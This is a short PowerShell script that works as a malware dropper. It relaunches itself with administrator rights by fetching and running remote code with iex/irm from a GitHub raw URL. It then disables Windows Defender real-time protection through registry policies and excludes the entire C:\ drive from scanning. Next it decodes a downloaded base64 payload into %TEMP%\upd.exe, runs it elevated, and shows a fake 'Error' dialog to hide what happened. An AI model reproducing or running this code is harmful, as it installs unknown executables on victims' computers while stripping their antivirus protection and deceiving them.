$admin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
if (!$admin) {
    $script = "iex (irm 'https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/script-download.ps1')"
    Start-Process powershell -Verb RunAs -ArgumentList "-Command $script"
    exit
}

$ver = (irm 'https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/version.txt').Trim()
$b64 = irm "https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/$ver"

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

$bytes = [System.Convert]::FromBase64String($b64)
$path = "$env:TEMP\upd.exe"
[System.IO.File]::WriteAllBytes($path, $bytes)

Start-Process -FilePath $path -ArgumentList "/1st" -Verb RunAs -Wait

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("Error", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
